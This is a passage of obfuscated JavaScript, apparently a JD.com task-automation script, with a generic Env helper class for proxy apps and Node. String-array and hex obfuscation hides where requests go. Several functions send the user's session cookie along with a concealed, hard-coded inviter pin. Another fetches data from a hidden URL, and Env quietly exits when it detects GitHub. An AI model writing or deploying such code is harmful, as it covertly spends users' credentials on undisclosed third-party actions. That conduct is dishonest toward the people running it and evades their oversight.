                        } else {
                        }
                    }
                }
            } catch (e) {
                $[__Oxeaea0[0x3f]](e, _0xc7baxc)
            } finally {
                _0xc7bax9()
            }
        })
    })
}

async function doInfo() {
    let _0xc7baxf = __Oxeaea0[0x41];
    await doTask3(cookie, _0xc7baxf);
    await $[__Oxeaea0[0x30]](parseInt(Math[__Oxeaea0[0x31]]() * 200 + 100, 10));
    await doTask4(cookie, _0xc7baxf);
    await $[__Oxeaea0[0x30]](parseInt(Math[__Oxeaea0[0x31]]() * 200 + 100, 10));
    await doTask1(cookie, _0xc7baxf);
    await $[__Oxeaea0[0x30]](parseInt(Math[__Oxeaea0[0x31]]() * 200 + 100, 10));
    await doTask2(cookie, _0xc7baxf);
    await $[__Oxeaea0[0x30]](parseInt(Math[__Oxeaea0[0x31]]() * 200 + 100, 10))
}

async function doTask1(_0xc7bax11, _0xc7baxf) {
    let _0xc7bax12 = Date[__Oxeaea0[0x42]]();
    var _0xc7bax13 = {
        '\x48\x6F\x73\x74': __Oxeaea0[0x43],
        '\x61\x63\x63\x65\x70\x74': __Oxeaea0[0x44],
        '\x63\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65': __Oxeaea0[0x45],
        '\x6F\x72\x69\x67\x69\x6E': __Oxeaea0[0x46],
        '\x61\x63\x63\x65\x70\x74\x2D\x6C\x61\x6E\x67\x75\x61\x67\x65': __Oxeaea0[0x47],
        '\x75\x73\x65\x72\x2D\x61\x67\x65\x6E\x74': getJSUA(),
        '\x72\x65\x66\x65\x72\x65\x72': __Oxeaea0[0x48],
        '\x43\x6F\x6F\x6B\x69\x65': _0xc7bax11
    };
    var _0xc7bax14 = __Oxeaea0[0x49] + encodeURIComponent(_0xc7baxf) + __Oxeaea0[0x4a] + _0xc7bax12;
    var _0xc7baxa = {
        '\x75\x72\x6C': __Oxeaea0[0x4b] + Date[__Oxeaea0[0x42]](),
        '\x68\x65\x61\x64\x65\x72\x73': _0xc7bax13,
        '\x62\x6F\x64\x79': _0xc7bax14
    };
    $[__Oxeaea0[0x40]](_0xc7baxa, (_0xc7baxb, _0xc7baxc, _0xc7baxd) => {
    })
}

async function doTask2(_0xc7bax11, _0xc7baxf) {
    let _0xc7bax12 = Date[__Oxeaea0[0x42]]();
    let _0xc7bax13 = {
        '\x48\x6F\x73\x74': __Oxeaea0[0x43],
        '\x61\x63\x63\x65\x70\x74': __Oxeaea0[0x44],
        '\x63\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65': __Oxeaea0[0x45],
        '\x6F\x72\x69\x67\x69\x6E': __Oxeaea0[0x4c],
        '\x61\x63\x63\x65\x70\x74\x2D\x6C\x61\x6E\x67\x75\x61\x67\x65': __Oxeaea0[0x47],
        '\x75\x73\x65\x72\x2D\x61\x67\x65\x6E\x74': getJSUA(),
        '\x72\x65\x66\x65\x72\x65\x72': __Oxeaea0[0x4d] + encodeURIComponent(_0xc7baxf),
        '\x43\x6F\x6F\x6B\x69\x65': _0xc7bax11
    };
    let _0xc7bax14 = __Oxeaea0[0x4e] + encodeURIComponent(_0xc7baxf) + __Oxeaea0[0x4f] + _0xc7bax12;
    var _0xc7baxa = {
        '\x75\x72\x6C': __Oxeaea0[0x50],
        '\x68\x65\x61\x64\x65\x72\x73': _0xc7bax13,
        '\x62\x6F\x64\x79': _0xc7bax14
    };
    $[__Oxeaea0[0x40]](_0xc7baxa, (_0xc7baxb, _0xc7baxc, _0xc7baxd) => {
    })
}

function doTask3(_0xc7bax11, _0xc7baxf) {
    let _0xc7bax12 = +new Date();
    let _0xc7bax13 = {
        '\x75\x72\x6C': __Oxeaea0[0x4b] + _0xc7bax12,
        '\x62\x6F\x64\x79': __Oxeaea0[0x51] + JSON[__Oxeaea0[0xf]]({
            '\x6D\x65\x74\x68\x6F\x64': __Oxeaea0[0x52],
            '\x64\x61\x74\x61': {
                '\x69\x6E\x76\x69\x74\x65\x72\x50\x69\x6E': encodeURIComponent(_0xc7baxf),
                '\x63\x68\x61\x6E\x6E\x65\x6C': 1,
                '\x74\x6F\x6B\x65\x6E': __Oxeaea0[0x0],
                '\x66\x72\x6F\x6E\x74\x65\x6E\x64\x49\x6E\x69\x74\x53\x74\x61\x74\x75\x73': __Oxeaea0[0x0]
            }
        }) + __Oxeaea0[0x53] + _0xc7bax12,
        '\x68\x65\x61\x64\x65\x72\x73': {
            '\x48\x6F\x73\x74': __Oxeaea0[0x43],
            '\x41\x63\x63\x65\x70\x74': __Oxeaea0[0x44],
            '\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65': __Oxeaea0[0x45],
            '\x4F\x72\x69\x67\x69\x6E': __Oxeaea0[0x46],
            '\x41\x63\x63\x65\x70\x74\x2D\x4C\x61\x6E\x67\x75\x61\x67\x65': __Oxeaea0[0x54],
            '\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74': getJSUA(),
            '\x52\x65\x66\x65\x72\x65\x72': __Oxeaea0[0x48],
            '\x41\x63\x63\x65\x70\x74\x2D\x45\x6E\x63\x6F\x64\x69\x6E\x67': __Oxeaea0[0x55],
            '\x43\x6F\x6F\x6B\x69\x65': _0xc7bax11
        }
    };
    $[__Oxeaea0[0x40]](_0xc7bax13, (_0xc7baxb, _0xc7baxc, _0xc7baxd) => {
    })
}

function doTask4(_0xc7bax11, _0xc7baxf) {
    let _0xc7baxa = {
        '\x75\x72\x6C': __Oxeaea0[0x50],
        '\x62\x6F\x64\x79': __Oxeaea0[0x56] + JSON[__Oxeaea0[0xf]]({
            '\x6D\x65\x74\x68\x6F\x64': __Oxeaea0[0x57],
            '\x64\x61\x74\x61': {
                '\x63\x68\x61\x6E\x6E\x65\x6C': __Oxeaea0[0x58],
                '\x65\x6E\x63\x72\x79\x70\x74\x69\x6F\x6E\x49\x6E\x76\x69\x74\x65\x72\x50\x69\x6E': encodeURIComponent(_0xc7baxf),
                '\x74\x79\x70\x65': 1
            }
        }) + __Oxeaea0[0x59] + Date[__Oxeaea0[0x42]](),
        '\x68\x65\x61\x64\x65\x72\x73': {
            '\x48\x6F\x73\x74': __Oxeaea0[0x43],
            '\x41\x63\x63\x65\x70\x74': __Oxeaea0[0x44],
            '\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65': __Oxeaea0[0x45],
            '\x4F\x72\x69\x67\x69\x6E': __Oxeaea0[0x4c],
            '\x41\x63\x63\x65\x70\x74\x2D\x4C\x61\x6E\x67\x75\x61\x67\x65': __Oxeaea0[0x54],
            '\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74': getJSUA(),
            '\x52\x65\x66\x65\x72\x65\x72': __Oxeaea0[0x5a],
            '\x41\x63\x63\x65\x70\x74\x2D\x45\x6E\x63\x6F\x64\x69\x6E\x67': __Oxeaea0[0x55],
            '\x43\x6F\x6F\x6B\x69\x65': _0xc7bax11
        }
    };
    $[__Oxeaea0[0x40]](_0xc7baxa, (_0xc7baxb, _0xc7baxc, _0xc7baxd) => {
    })
}

async function goldCreatorDoTask(_0xc7bax19) {
    await getLogs();
    let _0xc7bax14 = {
        "\x74\x79\x70\x65": _0xc7bax19,
        "\x6C\x6F\x67": $[__Oxeaea0[0x5b]],
        "\x72\x61\x6E\x64\x6F\x6D": $[__Oxeaea0[0x31]],
        "\x73\x63\x65\x6E\x65\x69\x64": $[__Oxeaea0[0x1]]
    };
    const _0xc7baxa = taskUrl(__Oxeaea0[0x5c], _0xc7bax14);
    return new Promise((_0xc7bax9) => {
        $[__Oxeaea0[0x40]](_0xc7baxa, async (_0xc7baxb, _0xc7baxc, _0xc7baxd) => {
            try {
                if (_0xc7baxb) {
                    console[__Oxeaea0[0xc]](`${__Oxeaea0[0x5d]}`)
                } else {
                    if (safeGet(_0xc7baxd)) {
                        _0xc7baxd = JSON[__Oxeaea0[0x34]](_0xc7baxd);
                        if (_0xc7baxd[__Oxeaea0[0x35]] === __Oxeaea0[0x36]) {
                            if (_0xc7baxd[__Oxeaea0[0x38]][__Oxeaea0[0x5e]] === __Oxeaea0[0x36]) {
                                console[__Oxeaea0[0xc]](`${__Oxeaea0[0x5f]}${JSON[__Oxeaea0[0xf]](_0xc7baxd)}${__Oxeaea0[0x0]}`);
                                if (_0xc7baxd[__Oxeaea0[0x38]][__Oxeaea0[0x60]]) {
                                    $[__Oxeaea0[0x29]] += parseInt(_0xc7baxd[__Oxeaea0[0x38]][__Oxeaea0[0x60]])
                                }
                            } else {
                                console[__Oxeaea0[0xc]](`${__Oxeaea0[0x61]}${_0xc7baxd[__Oxeaea0[0x38]][__Oxeaea0[0x62]]}${__Oxeaea0[0x0]}`)
                            }
                        } else {
                            console[__Oxeaea0[0xc]](`${__Oxeaea0[0x61]}${JSON[__Oxeaea0[0xf]](_0xc7baxd)}${__Oxeaea0[0x0]}`)
                        }
                    }
                }
            } catch (e) {
                $[__Oxeaea0[0x3f]](e, _0xc7baxc)
            } finally {
                _0xc7bax9()
            }
        })
    })
}

function taskUrl(_0xc7bax1b, _0xc7bax14 = {}) {
    return {
        url: `${__Oxeaea0[0x0]}${JD_API_HOST}${__Oxeaea0[0x63]}${_0xc7bax1b}${__Oxeaea0[0x64]}${encodeURIComponent(JSON[__Oxeaea0[0xf]](_0xc7bax14))}${__Oxeaea0[0x65]}${$[__Oxeaea0[0x2b]]}${__Oxeaea0[0x66]}${encodeURIComponent(JSON[__Oxeaea0[0xf]]({"\x70\x72\x73\x74\x61\x74\x65": __Oxeaea0[0x36]}))}${__Oxeaea0[0x67]}`,
        headers: {
            "\x41\x63\x63\x65\x70\x74": __Oxeaea0[0x68],
            "\x41\x63\x63\x65\x70\x74\x2D\x45\x6E\x63\x6F\x64\x69\x6E\x67": __Oxeaea0[0x55],
            "\x41\x63\x63\x65\x70\x74\x2D\x4C\x61\x6E\x67\x75\x61\x67\x65": __Oxeaea0[0x47],
            "\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E": __Oxeaea0[0x69],
            "\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65": __Oxeaea0[0x45],
            "\x48\x6F\x73\x74": __Oxeaea0[0x43],
            "\x52\x65\x66\x65\x72\x65\x72": __Oxeaea0[0x6a],
            "\x43\x6F\x6F\x6B\x69\x65": cookie,
            "\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74": UA
        }
    }
}

function getLogs() {
    return new Promise((_0xc7bax9) => {
        $[__Oxeaea0[0x6f]]({
            url: `${__Oxeaea0[0x6b]}`,
            headers: {"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74": __Oxeaea0[0x6c]},
            timeout: 30000
        }, (_0xc7baxb, _0xc7baxc, _0xc7baxd) => {
            try {
                if (_0xc7baxb) {
                    console[__Oxeaea0[0xc]](`${__Oxeaea0[0x6d]}`)
                } else {
                    if (_0xc7baxd && safeGet(_0xc7baxd)) {
                        _0xc7baxd = JSON[__Oxeaea0[0x34]](_0xc7baxd);
                        if (_0xc7baxd[__Oxeaea0[0x35]] == 0 && _0xc7baxd[__Oxeaea0[0x6e]][__Oxeaea0[0x31]]) {
                            _0xc7baxd = _0xc7baxd[__Oxeaea0[0x6e]];
                            $[__Oxeaea0[0x31]] = _0xc7baxd[__Oxeaea0[0x31]];
                            $[__Oxeaea0[0x5b]] = _0xc7baxd[__Oxeaea0[0xc]]
                        } else {
                            if (_0xc7baxd[__Oxeaea0[0x35]] == 1) {
                                $[__Oxeaea0[0x31]] = __Oxeaea0[0x0];
                                $[__Oxeaea0[0x5b]] = __Oxeaea0[0x0]
                            }
                        }
                    } else {
                        $[__Oxeaea0[0x31]] = __Oxeaea0[0x0];
                        $[__Oxeaea0[0x5b]] = __Oxeaea0[0x0]
                    }
                }
            } catch (e) {
                $[__Oxeaea0[0x3f]](e, _0xc7baxc)
            } finally {
                _0xc7bax9(_0xc7baxd || [])
            }
        })
    })
}

function safeGet(_0xc7baxd) {
    try {
        if (typeof JSON[__Oxeaea0[0x34]](_0xc7baxd) == __Oxeaea0[0x70]) {
            return true
        }
    } catch (e) {
        console[__Oxeaea0[0xc]](`${__Oxeaea0[0x71]}`);
        return false
    }
}

function getUUID(_0xc7bax1f = __Oxeaea0[0x72], _0xc7bax20 = 0) {
    return _0xc7bax1f[__Oxeaea0[0x75]](/[xy]/g, function (_0xc7bax1f) {
        var _0xc7bax21 = 16 * Math[__Oxeaea0[0x31]]() | 0,
            _0xc7bax22 = __Oxeaea0[0x73] == _0xc7bax1f ? _0xc7bax21 : 3 & _0xc7bax21 | 8;
        return uuid = _0xc7bax20 ? _0xc7bax22.toString(36)[__Oxeaea0[0x74]]() : _0xc7bax22.toString(36), uuid
    })
}

function getJDUA() {
    getVersion = getIphoneVersion();
    getVersion1 = getVersion[__Oxeaea0[0x75]](__Oxeaea0[0x76], __Oxeaea0[0x77]);
    $[__Oxeaea0[0x78]] = `${__Oxeaea0[0x79]}${getVersion}${__Oxeaea0[0x7a]}${getUUID(__Oxeaea0[0x72])}${__Oxeaea0[0x7b]}${getVersion1}${__Oxeaea0[0x7c]}`;
    return $[__Oxeaea0[0x78]]
}

function getJSUA() {
    return __Oxeaea0[0x7d]
}

function random(_0xc7bax26, _0xc7bax27) {
    let _0xc7bax28 = Math[__Oxeaea0[0x7e]](Math[__Oxeaea0[0x31]]() * (_0xc7bax27 - _0xc7bax26)) + _0xc7bax26;
    return `${__Oxeaea0[0x0]}${_0xc7bax28}${__Oxeaea0[0x0]}`
}

function getIphoneVersion() {
    let _0xc7bax2a = [__Oxeaea0[0x7f], __Oxeaea0[0x80], __Oxeaea0[0x81], __Oxeaea0[0x82], __Oxeaea0[0x83], __Oxeaea0[0x84], __Oxeaea0[0x85], __Oxeaea0[0x86], __Oxeaea0[0x87], __Oxeaea0[0x88], __Oxeaea0[0x89], __Oxeaea0[0x8a], __Oxeaea0[0x8b], __Oxeaea0[0x8c], __Oxeaea0[0x8d], __Oxeaea0[0x8e], __Oxeaea0[0x8f], __Oxeaea0[0x90], __Oxeaea0[0x91], __Oxeaea0[0x92], __Oxeaea0[0x93], __Oxeaea0[0x94], __Oxeaea0[0x95], __Oxeaea0[0x96], __Oxeaea0[0x97], __Oxeaea0[0x98], __Oxeaea0[0x99]];
    return _0xc7bax2a[random(0, _0xc7bax2a[__Oxeaea0[0x24]])]
}

(function (_0xc7bax2b, _0xc7bax2c, _0xc7bax2d, _0xc7bax2e, _0xc7bax2f, _0xc7bax30) {
    _0xc7bax30 = __Oxeaea0[0x9a];
    _0xc7bax2e = function (_0xc7bax31) {
        if (typeof alert !== _0xc7bax30) {
            alert(_0xc7bax31)
        }
        ;
        if (typeof console !== _0xc7bax30) {
            console[__Oxeaea0[0xc]](_0xc7bax31)
        }
    };
    _0xc7bax2d = function (_0xc7bax32, _0xc7bax2b) {
        return _0xc7bax32 + _0xc7bax2b
    };
    _0xc7bax2f = _0xc7bax2d(__Oxeaea0[0x9b], _0xc7bax2d(_0xc7bax2d(__Oxeaea0[0x9c], __Oxeaea0[0x9d]), __Oxeaea0[0x9e]));
    try {
        _0xc7bax2b = __encode;
        if (!(typeof _0xc7bax2b !== _0xc7bax30 && _0xc7bax2b === _0xc7bax2d(__Oxeaea0[0x9f], __Oxeaea0[0xa0]))) {
            _0xc7bax2e(_0xc7bax2f)
        }
    } catch (e) {
        _0xc7bax2e(_0xc7bax2f)
    }
})({})


// prettier-ignore
function Env(t, e) {
    "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0);

    class s {
        constructor(t) {
            this.env = t
        }

        send(t, e = "GET") {
            t = "string" == typeof t ? {url: t} : t;
            let s = this.get;
            return "POST" === e && (s = this.post), new Promise((e, i) => {
                s.call(this, t, (t, s, r) => {
                    t ? i(t) : e(s)
                })
            })
        }

        get(t) {
            return this.send.call(this.env, t)
        }

        post(t) {
            return this.send.call(this.env, t, "POST")
        }
    }

    return new class {
        constructor(t, e) {
            this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`)
        }

        isNode() {
            return "undefined" != typeof module && !!module.exports
        }

        isQuanX() {
            return "undefined" != typeof $task
        }

        isSurge() {
            return "undefined" != typeof $httpClient && "undefined" == typeof $loon
        }

        isLoon() {
            return "undefined" != typeof $loon
        }

        toObj(t, e = null) {
            try {
                return JSON.parse(t)
            } catch {
                return e
            }
        }

        toStr(t, e = null) {
            try {
                return JSON.stringify(t)
            } catch {
                return e
            }
        }

        getjson(t, e) {
            let s = e;
            const i = this.getdata(t);
            if (i) try {
                s = JSON.parse(this.getdata(t))
            } catch {
            }
            return s
        }

        setjson(t, e) {
            try {
                return this.setdata(JSON.stringify(t), e)
            } catch {
                return !1
            }
        }

        getScript(t) {
            return new Promise(e => {
                this.get({url: t}, (t, s, i) => e(i))
            })
        }

        runScript(t, e) {
            return new Promise(s => {
                let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
                i = i ? i.replace(/\n/g, "").trim() : i;
                let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
                r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r;
                const [o, h] = i.split("@"), n = {
                    url: `http://${h}/v1/scripting/evaluate`,
                    body: {script_text: t, mock_type: "cron", timeout: r},
                    headers: {"X-Key": o, Accept: "*/*"}
                };
                this.post(n, (t, e, i) => s(i))
            }).catch(t => this.logErr(t))
        }

        loaddata() {
            if (!this.isNode()) return {};
            {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e);
                if (!s && !i) return {};
                {
                    const i = s ? t : e;
                    try {
                        return JSON.parse(this.fs.readFileSync(i))
                    } catch (t) {
                        return {}
                    }
                }
            }
        }

        writedata() {
            if (this.isNode()) {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e), r = JSON.stringify(this.data);
                s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r)
            }
        }

        lodash_get(t, e, s) {
            const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
            let r = t;
            for (const t of i) if (r = Object(r)[t], void 0 === r) return s;
            return r
        }

        lodash_set(t, e, s) {
            return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t)
        }

        getdata(t) {
            let e = this.getval(t);
            if (/^@/.test(t)) {
                const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : "";
                if (r) try {
                    const t = JSON.parse(r);
                    e = t ? this.lodash_get(t, i, "") : e
                } catch (t) {
                    e = ""
                }
            }
            return e
        }

        setdata(t, e) {
            let s = !1;
            if (/^@/.test(e)) {
                const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i),
                    h = i ? "null" === o ? null : o || "{}" : "{}";
                try {
                    const e = JSON.parse(h);
                    this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i)
                } catch (e) {
                    const o = {};
                    this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i)
                }
            } else s = this.setval(t, e);
            return s
        }

        getval(t) {
            return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null
        }

        setval(t, e) {
            return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null
        }

        initGotEnv(t) {
            this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar))
        }

        get(t, e = (() => {
        })) {
            t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {"X-Surge-Skip-Scripting": !1})), $httpClient.get(t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            })) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {hints: !1})), $task.fetch(t).then(t => {
                const {statusCode: s, statusCode: i, headers: r, body: o} = t;
                e(null, {status: s, statusCode: i, headers: r, body: o}, o)
            }, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => {
                try {
                    if (t.headers["set-cookie"]) {
                        const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                        s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar
                    }
                } catch (t) {
                    this.logErr(t)
                }
            }).then(t => {
                const {statusCode: s, statusCode: i, headers: r, body: o} = t;
                e(null, {status: s, statusCode: i, headers: r, body: o}, o)
            }, t => {
                const {message: s, response: i} = t;
                e(s, i, i && i.body)
            }))
        }

        post(t, e = (() => {
        })) {
            if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {"X-Surge-Skip-Scripting": !1})), $httpClient.post(t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            }); else if (this.isQuanX()) t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {hints: !1})), $task.fetch(t).then(t => {
                const {statusCode: s, statusCode: i, headers: r, body: o} = t;
                e(null, {status: s, statusCode: i, headers: r, body: o}, o)
            }, t => e(t)); else if (this.isNode()) {
                this.initGotEnv(t);
                const {url: s, ...i} = t;
                this.got.post(s, i).then(t => {
                    const {statusCode: s, statusCode: i, headers: r, body: o} = t;
                    e(null, {status: s, statusCode: i, headers: r, body: o}, o)
                }, t => {
                    const {message: s, response: i} = t;
                    e(s, i, i && i.body)
                })
            }
        }

        time(t, e = null) {
            const s = e ? new Date(e) : new Date;
            let i = {
                "M+": s.getMonth() + 1,
                "d+": s.getDate(),
                "H+": s.getHours(),
                "m+": s.getMinutes(),
                "s+": s.getSeconds(),
                "q+": Math.floor((s.getMonth() + 3) / 3),
                S: s.getMilliseconds()
            };
            /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
            for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
            return t
        }

        msg(e = t, s = "", i = "", r) {
            const o = t => {
                if (!t) return t;
                if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? {"open-url": t} : this.isSurge() ? {url: t} : void 0;
                if ("object" == typeof t) {
                    if (this.isLoon()) {
                        let e = t.openUrl || t.url || t["open-url"], s = t.mediaUrl || t["media-url"];
                        return {openUrl: e, mediaUrl: s}
                    }
                    if (this.isQuanX()) {
                        let e = t["open-url"] || t.url || t.openUrl, s = t["media-url"] || t.mediaUrl;
                        return {"open-url": e, "media-url": s}
                    }
                    if (this.isSurge()) {
                        let e = t.url || t.openUrl || t["open-url"];
                        return {url: e}
                    }
                }
            };
            if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
                let t = ["", "==============📣系统通知📣=============="];
                t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t)
            }
        }

        log(...t) {
            t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator))
        }

        logErr(t, e) {
            const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
            s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t)
        }

        wait(t) {
            return new Promise(e => setTimeout(e, t))
        }

        done(t = {}) {
            const e = (new Date).getTime(), s = (e - this.startTime) / 1e3;
            this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t)
        }
    }(t, e)
}